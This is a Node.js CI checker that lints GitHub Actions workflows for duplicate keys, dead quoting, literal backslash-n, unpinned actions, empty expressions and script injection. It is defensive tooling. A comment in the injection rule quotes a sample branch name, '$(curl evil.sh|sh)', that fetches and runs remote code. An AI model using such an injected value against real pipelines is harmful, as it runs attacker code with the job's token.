#!/usr/bin/env node
/**
 * Five things a YAML parser and `bash -n` both wave through. The first took a release chain down
 * for six hours without producing a single line of log; the third quietly switched half of a
 * dashboard off for a day and kept every job green while it did; the fourth is the one that would
 * not announce itself at all; the fifth was a comment.
 *
 * 1. A DUPLICATE KEY in any mapping. YAML libraries keep the last one silently -- js-yaml and
 *    PyYAML both do -- so the file parses, the shell script parses, and every local check is green.
 *    GitHub's own validator rejects it, and the run it rejects has zero jobs and no log: it shows
 *    up only as a red row named after the workflow's own path. The first one was a mechanical
 *    rewrite that bound `${{ }}` expressions to env vars and derived each name from the last path
 *    segment, so `steps.check.outputs.errors`, `steps.format.outputs.errors` and
 *    `steps.templates.outputs.errors` all became OUT_ERRORS in one `env:` block; even had GitHub
 *    accepted it, the shell below summed one value three times and labelled it three different
 *    ways. The second was an edit script that ran twice and inserted the same `secrets:` block
 *    under `workflow_call:` twice, which took out a pull-request pipeline the same way. This rule
 *    started out looking only inside `env:` blocks and so missed the second; it now walks every
 *    mapping, resetting at each `-` sequence item because each item is a mapping of its own, and
 *    skipping block scalars because a `run: |` body is text, not keys.
 *
 * 2. A SINGLE-QUOTED expansion, `VAR='${OTHER}'`. In bash that is a literal seven-character string,
 *    not the value. It is the natural output of rewriting `VAR='${{ inputs.x }}'` -- where the
 *    single quotes were doing real work, keeping the interpolated JSON in one word -- into an env
 *    reference, where they now prevent the expansion entirely. Downstream `jq` gets the string
 *    "${IN_CONFIG_JSON}" and fails somewhere far from the cause.
 *
 * 3. A LITERAL BACKSLASH-N where a line continuation was meant: `foo \n            bar`, the two
 *    characters rather than a real newline. It is what an editing script leaves behind when its own
 *    escaping collapses, and the eye reads it as a wrapped line. bash reads `\n` as an escaped `n`,
 *    so the command gains a bare argument `n` and the flags after it land somewhere the tool never
 *    looks. Nothing fails: the step exits 0, the job is green, and those flags simply had no
 *    effect. That is how the backend's dashboard came to trend tests and coverage but never
 *    mutation or security, with `--mutation` and `--security` sitting right there in the workflow.
 *
 * 4. AN ACTION ON A MUTABLE REF, `uses: owner/action@v4`. A tag is a pointer its owner can move,
 *    so the step that ran yesterday is not necessarily the step that runs today, and a compromised
 *    or retagged action executes with whatever the job's token can reach. Pinning to the commit
 *    SHA is what makes a workflow reproducible and what a supply-chain review asks for first.
 *    Semgrep's github-actions-mutable-action-tag finds these, but only in the security tier and
 *    only as a warning, and by then the change is on main; this is the same check on the PR gate.
 *    Keep the version in a trailing comment -- `@<sha>  # v4.38.0` -- because the SHA is the
 *    contract and the comment is how a human reads it. Local `./.github/workflows/...` references
 *    and `docker://` images are not tags and are left alone.
 *
 * 5. AN EMPTY EXPRESSION, the two braces with nothing between them. GitHub parses expressions in
 *    every VALUE, which includes the body of a `run:` block, and an empty one is a syntax error
 *    that rejects the whole file -- zero jobs, no log, a run named after the path. YAML comments
 *    are safe because they are not values, which is the trap: two workflows carried the same
 *    sentence, one as a step-level comment and one inside the script it was explaining, and only
 *    the second was refused. The sentence was about how expressions get pasted into the shell.
 *
 * Scans every workflow in the repositories given on the command line (default: this one).
 *
 *   node tools/ci/check-workflow-env.mjs [repoRoot ...]
 */
import { readdirSync, readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';

const roots = process.argv.slice(2);
if (!roots.length) roots.push('.');

/** Duplicates are found by indentation rather than by parsing, because the parser is the thing
 *  that hides the bug: it collapses the duplicate before anyone can see it.
 *
 *  Scope rules, and why each one is here:
 *   - a `-` starts a sequence item, and each item is its own mapping, so two steps may both say
 *     `uses:` without that being a duplicate;
 *   - a block scalar (`run: |`, `if: >-`) is text, so everything indented under it is skipped --
 *     a shell heredoc that writes YAML would otherwise read as a nest of keys;
 *   - a key at a shallower indent closes every deeper scope, so two jobs may share `runs-on:`. */
function duplicateMappingKeys(text) {
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  const found = [];
  const stack = [];
  let insideBlockScalarAt = -1;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim() === '' || /^\s*#/.test(line)) continue;
    const indent = line.length - line.trimStart().length;

    if (insideBlockScalarAt >= 0) {
      if (indent > insideBlockScalarAt) continue;
      insideBlockScalarAt = -1;
    }

    let body = line.trimStart();
    let keyIndent = indent;
    if (body.startsWith('- ')) {
      keyIndent = indent + 2;
      while (stack.length && stack[stack.length - 1].indent >= keyIndent) stack.pop();
      stack.push({ indent: keyIndent, seen: new Map() });
      body = body.slice(2);
    } else if (body === '-' || body.startsWith('-')) {
      while (stack.length && stack[stack.length - 1].indent > indent) stack.pop();
      continue;
    } else {
      while (stack.length && stack[stack.length - 1].indent > keyIndent) stack.pop();
    }

    const m = /^([A-Za-z_][\w.-]*)\s*:(\s|$)/.exec(body);
    if (!m) continue;

    if (!stack.length || stack[stack.length - 1].indent !== keyIndent) {
      stack.push({ indent: keyIndent, seen: new Map() });
    }
    const scope = stack[stack.length - 1];
    const key = m[1];
    const at = scope.seen.get(key);
    if (at) {
      at.push(i + 1);
      if (at.length === 2) found.push({ key, at });
    } else {
      scope.seen.set(key, [i + 1]);
    }

    if (/:\s*[|>][-+0-9]*\s*$/.test(body)) insideBlockScalarAt = keyIndent;
  }
  return found;
}

/** A single-quoted `${VAR}` that is NOT already inside a double-quoted string on the same line.
 *  `echo "value: '${VAR}'"` is fine -- the outer quotes expand and the inner ones are decoration. */
function deadSingleQuotedExpansions(text) {
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  const found = [];
  lines.forEach((line, idx) => {
    const m = /'\$\{[A-Za-z_][A-Za-z0-9_]*\}'/.exec(line);
    if (!m) return;
    const before = line.slice(0, m.index);
    const doubleQuotesBefore = (before.match(/"/g) || []).length;
    if (doubleQuotesBefore % 2 === 1) return; // inside a double-quoted string: expands fine
    found.push({ line: idx + 1, text: line.trim() });
  });
  return found;
}

/** A literal backslash-n with whitespace on both sides. Inside quotes it is a legitimate escape
 *  (`printf 'a\nb'`, `tr '\n' ' '`), so the quote parity before it has to be even on both kinds of
 *  quote, which is the same test the rule above uses. */
function literalBackslashN(text) {
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  const found = [];
  lines.forEach((line, idx) => {
    const m = /\s\\n\s/.exec(line);
    if (!m) return;
    const before = line.slice(0, m.index + 1);
    if ((before.match(/'/g) || []).length % 2 === 1) return;
    if ((before.match(/"/g) || []).length % 2 === 1) return;
    found.push({ line: idx + 1, text: line.trim() });
  });
  return found;
}

/** `uses:` on anything that is not a 40-hex commit SHA. Local paths and docker images are not
 *  pinnable refs and are skipped; everything else has to name a commit. */
function mutableActionRefs(text) {
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  const found = [];
  lines.forEach((line, idx) => {
    const m = /^\s*(?:-\s*)?uses:\s*(\S+)/.exec(line);
    if (!m) return;
    const ref = m[1].replace(/^['"]|['"]$/g, '');
    if (ref.startsWith('./') || ref.startsWith('docker://')) return;
    const at = ref.lastIndexOf('@');
    if (at < 0) {
      found.push({ line: idx + 1, ref, why: 'no ref at all' });
      return;
    }
    const version = ref.slice(at + 1);
    if (!/^[0-9a-f]{40}$/.test(version)) {
      found.push({ line: idx + 1, ref, why: `@${version} is a tag or branch, not a commit` });
    }
  });
  return found;
}

/** `${{ }}` with nothing between the braces. Anywhere at all: a YAML comment is safe today, but
 *  the same sentence moves into a `run:` body the moment someone tidies it, and there is no reason
 *  to write one. */
function emptyExpressions(text) {
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  const found = [];
  lines.forEach((line, idx) => {
    if (/\$\{\{\s*\}\}/.test(line)) found.push({ line: idx + 1, text: line.trim() });
  });
  return found;
}

/**
 * Rule 6 — a value somebody outside this repository can choose, interpolated into a `run:` body.
 *
 * A `run:` block is assembled as text before any shell sees it, so an expression in one is not an
 * argument, it is source code. A branch called `$(curl evil.sh|sh)` runs on the runner with the
 * job's token, on a pull request anyone can open. GitHub's guidance is the same every time: put the
 * value in `env:` and read `$VAR`, where a shell treats it as data.
 *
 * The list below is deliberately the things a STRANGER can type — ref and branch names, anything
 * under `github.event`, and dispatch inputs — plus `secrets.*`, which belongs in env for a
 * different reason: a secret pasted into a script is one `set -x` from the log, and one awkward
 * character from being a syntax error in the middle of a deploy.
 *
 * What it does not flag is what this repository's own jobs produce: run numbers, shas, job results,
 * step outcomes, matrix values, job outputs. Those can carry untrusted data if a job puts it there,
 * and a rule that says so would be more correct and would flag twenty-one lines of summary tables
 * that echo a build version. A gate nobody can satisfy gets switched off, so this one draws the
 * line where the value stops being ours.
 *
 * Written after Semgrep's run-shell-injection found three of these here, in ci-tests, mutation and
 * nightly-full-stack, and four more in the backend's deployment chain.
 */
const RUN_BODY_UNTRUSTED = [
  /^github\.event\b/,
  /^github\.head_ref$/,
  /^github\.ref(_name)?$/,
  /^github\.base_ref$/,
  /^github\.triggering_actor$/,
  /^inputs\./,
  /^github\.event\.inputs\./,
  /^secrets\./,
];

function interpolationsInRunBodies(text) {
  const lines = text.replace(/\r\n/g, '\n').split('\n');
  const found = [];
  let indent = -1;
  lines.forEach((line, idx) => {
    const opens = line.match(/^(\s*)(?:- )?run: [|>]/);
    if (opens) {
      indent = opens[1].length;
      return;
    }
    if (indent < 0) return;
    const here = line.search(/\S/);
    if (line.trim() !== '' && here <= indent) {
      indent = -1;
      return;
    }
    for (const m of line.matchAll(/\$\{\{\s*([^}]*?)\s*\}\}/g)) {
      // Each operand of the expression, so `inputs.tag || 'main'` is caught by its left-hand side
      // and a literal default on the right is not mistaken for one.
      for (const operand of m[1].split(/\|\||&&/).map((x) => x.trim())) {
        if (!RUN_BODY_UNTRUSTED.some((bad) => bad.test(operand))) continue;
        found.push({ line: idx + 1, expr: operand, text: line.trim().slice(0, 90) });
        break;
      }
    }
  });
  return found;
}

let problems = 0;
let scanned = 0;
for (const root of roots) {
  const dir = join(root, '.github', 'workflows');
  if (!existsSync(dir)) continue;
  for (const name of readdirSync(dir).filter((f) => f.endsWith('.yml') || f.endsWith('.yaml'))) {
    const path = join(dir, name);
    const text = readFileSync(path, 'utf8');
    scanned++;
    for (const d of duplicateMappingKeys(text)) {
      problems++;
      console.error(
        `${path}: key ${d.key} defined ${d.at.length} times in one mapping (lines ` +
          `${d.at.join(', ')}) — YAML keeps the last one and GitHub rejects the workflow, ` +
          `with a zero-job startup failure and no log`,
      );
    }
    for (const d of deadSingleQuotedExpansions(text)) {
      problems++;
      console.error(
        `${path}:${d.line}: single-quoted expansion never expands in bash — ${d.text}`,
      );
    }
    for (const d of literalBackslashN(text)) {
      problems++;
      console.error(
        `${path}:${d.line}: literal backslash-n where a line continuation was meant — bash ` +
          `passes a bare argument \`n\` and silently drops the flags after it — ${d.text}`,
      );
    }
    for (const d of mutableActionRefs(text)) {
      problems++;
      console.error(
        `${path}:${d.line}: ${d.ref} is not pinned to a commit SHA — ${d.why} — a tag is a ` +
          `pointer its owner can move, so pin the SHA and keep the version in a trailing comment`,
      );
    }
    for (const d of interpolationsInRunBodies(text)) {
      problems++;
      console.error(
        `${path}:${d.line}: \`\${{ ${d.expr} }}\` is interpolated into a run: body — a run: ` +
          `block is assembled as text before a shell sees it, so a value somebody else chooses ` +
          `(a branch name, an event field, a dispatch input) becomes source code, and a secret ` +
          `becomes one \`set -x\` from the log. Put it in \`env:\` and read \`$VAR\` — ${d.text}`,
      );
    }
    for (const d of emptyExpressions(text)) {
      problems++;
      console.error(
        `${path}:${d.line}: empty \`\${{ }}\` expression — GitHub parses expressions in every ` +
          `value, including a run: body, and rejects the whole file — ${d.text}`,
      );
    }
  }
}

if (problems) {
  console.error(`\ncheck:workflow-env FAILED — ${problems} problem(s) across ${scanned} workflow(s).`);
  process.exit(1);
}
console.log(
  `check:workflow-env OK — ${scanned} workflow(s): no duplicate keys, no dead expansions,` +
    ` no literal backslash-n, every action pinned to a commit, no empty expressions,` +
    ` nothing anyone can type interpolated into a run: body.`,
);
